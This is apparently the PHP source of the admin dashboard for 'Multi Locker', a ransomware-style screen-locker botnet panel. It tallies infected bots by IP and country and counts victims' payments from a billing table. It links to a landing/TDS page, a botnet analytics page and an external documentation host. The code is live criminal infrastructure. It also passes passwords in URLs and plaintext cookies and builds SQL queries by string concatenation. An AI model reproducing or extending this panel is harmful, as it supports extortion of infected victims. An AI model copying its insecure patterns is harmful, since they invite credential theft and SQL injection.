<?php
error_reporting(0);
include('lending/include/config.php');
        $log = $_GET["log"];
        $pas = $_GET["pas"];
        if (empty($log) || empty($pas)) {
            $log = $_COOKIE["log"];
            $pas = $_COOKIE["pas"];
        }

        if ($log == $login && $pas == $pass) {
            setcookie("log", $log);
            setcookie("pas", $pas);

            
function TotalStuck()		
	{

			$result = mysql_query("SELECT ip FROM checklist GROUP by ip ORDER BY id desc ");
                                        $sum = mysql_num_rows($result);
										
										return $sum;
										
	}
										
			
			
            include('lending/include/db.php');

			
			
								
								
										

function total_online_bots_country($str)
{


$sql = "SELECT ip FROM checklist WHERE country='".$str."' and time>'".strtotime('-15 minute', time())."' GROUP by ip";

$sql_query = mysql_query($sql);
$row = mysql_num_rows($sql_query);

return $row;

}								
				
				
				
function total_bots_country($str)
{


$sql = "SELECT ip FROM checklist WHERE country='".$str."' GROUP by ip";

$sql_query = mysql_query($sql);
$row = mysql_num_rows($sql_query);

return $row;

}								
					


function country_img($str)	
{

return '<img src="flags/'.$str.'.gif" alt="'.$str.'" /> '.$str;

}		


            $result = mysql_query("SELECT COUNT(*) FROM billing ");
            $row = mysql_fetch_row($result);
			$oplat = (int)$row['0'];
           
              $otstukov=TotalStuck();
          
          
			      $result = mysql_query("SELECT ip FROM checklist ");
				  $ots0 = mysql_num_rows($result);
		                        
            
            ?>


<head>
	<meta charset="utf-8"/>
	<title>Dashboard I Admin Panel</title>
	
	<link rel="stylesheet" href="css/layout.css" type="text/css" media="screen" />
	<!--[if lt IE 9]>
	<link rel="stylesheet" href="css/ie.css" type="text/css" media="screen" />
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->
	<script src="js/jquery-1.5.2.min.js" type="text/javascript"></script>
	<script src="js/hideshow.js" type="text/javascript"></script>
	<script src="js/jquery.tablesorter.min.js" type="text/javascript"></script>
	<script type="text/javascript" src="js/jquery.equalHeight.js"></script>
	<script type="text/javascript">
	$(document).ready(function() 
    	{ 
      	  $(".tablesorter").tablesorter(); 
   	 } 
	);
	$(document).ready(function() {

	//When page loads...
	$(".tab_content").hide(); //Hide all content
	$("ul.tabs li:first").addClass("active").show(); //Activate first tab
	$(".tab_content:first").show(); //Show first tab content

	//On Click Event
	$("ul.tabs li").click(function() {

		$("ul.tabs li").removeClass("active"); //Remove any "active" class
		$(this).addClass("active"); //Add "active" class to selected tab
		$(".tab_content").hide(); //Hide all tab content

		var activeTab = $(this).find("a").attr("href"); //Find the href attribute value to identify the active tab + content
		$(activeTab).fadeIn(); //Fade in the active ID content
		return false;
	});

});
    </script>
    <script type="text/javascript">
    $(function(){
        $('.column').equalHeight();
    });
</script>

</head>


<body>

	<header id="header">
		<hgroup>
			<h1 class="site_title"><a href="index.php">Multi Locker</a></h1>
			<h2 class="section_title">Version 3</h2><div class="btn_view_site"><a href="lending/tds.php">Lending for me</a></div>
		</hgroup>
	</header> <!-- end of header bar -->
	
	<section id="secondary_bar">
		<div class="user">
			<p>You Support: support@profidns.net</p>
			<!-- <a class="logout_user" href="#" title="Logout">Logout</a> -->
		</div>
		<div class="breadcrumbs_container">
			<article class="breadcrumbs"><a href="index.php">Multi Locker</a> <div class="breadcrumb_divider"></div> <a class="current">Dash Board</a></article>
		</div>
	</section><!-- end of secondary bar -->
	
	<aside id="sidebar" class="column">
		<form class="quick_search">
			<input type="text" value="Quick Search" onfocus="if(!this._haschanged){this.value=''};this._haschanged=true;">
		</form>
		<hr/>
		<h3>Stats</h3>
		<ul class="toggle">
			<li class="icn_view_users"><a href="anal.php">Analytics botnet</a></li>
			<li class="icn_view_users"><a href="statss.php">Your Bots</a></li>
		
		</ul>
		<h3>Staff</h3>
		<ul class="toggle">
			<li class="icn_photo"><a href="biling.php">Billing</a></li>
			<li class="icn_folder"><a href="lend.php">Lending Page</a></li>
			<li class="icn_edit_article"><a href="http://62.76.45.94/manual/" target="_blank">Documentation</a></li>
		</ul>
		<h3>Admin</h3>
		<ul class="toggle">
			<li class="icn_settings"><a href="support.php">Support</a></li>
			<li class="icn_security"><a href="change.php">Change Password</a></li>
			<li class="icn_jump_back"><a href="logout.php">Logout</a></li>
		</ul>
		
		<footer>
			<hr />
			<p><strong>Copyright &copy; 2012 Multi Locker</strong></p>

		</footer>
	</aside><!-- end of sidebar -->
	
	<section id="main" class="column">
		
		<h4 class="alert_info">Welcome to the best Locker Dash Board!</h4>
		
		<article class="module width_full">
			<header><h3>Stats</h3></header>
			<div class="module_content">
				<article class="stats_graph">
<img src="images/map.png" alt="�����">
				</article>
				
				<article class="stats_overview">
					<div class="overview_today">
						<p class="overview_day">Bots</p>
						<p class="overview_count"><?php echo $otstukov; ?></p>
						<p class="overview_type">Uniq</p>
						<p class="overview_count"><?php echo $ots0; ?></p>
						<p class="overview_type">Lock page load</p>
					</div>
					<div class="overview_previous">
						<p class="overview_day">Payments</p>
						<p class="overview_count"><?php echo $oplat; ?></p>
						<p class="overview_type">Today</p>
						<p class="overview_count"><?php echo $oplat; ?></p>
						<p class="overview_type">Alltime</p>
					</div>
								
				</article>
				<br>
				<div class="clear"></div>
			</div>
		</article><!-- end of stats article -->
		
		
		
		<div class="clear"></div>
	


</body>
    <?php
} else 
{

    ?>

                

								<html><head><title>Default Template</title>
									        <LINK REL="SHORTCUT ICON" HREF="favicon.ico">
									        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
									        
										
									</head>
									
				
												<center>
												<form action="index.php">	
													<p>
														<label>Username</label>
														<input class="text-input" type="text" NAME="log" />
													</p>
													<div class="clear"></div>
													<p>
														<label>Password</label>
														<input class="text-input" type="password" NAME="pas" />
													</p>
													<div class="clear"></div>
													<p>
														<input class="button" type="submit" value="Sign In" />
													</p>
													
												</form>
									</center>
								  </body>
  
								</html>
    <?php
}
?>
                                        </body></html>
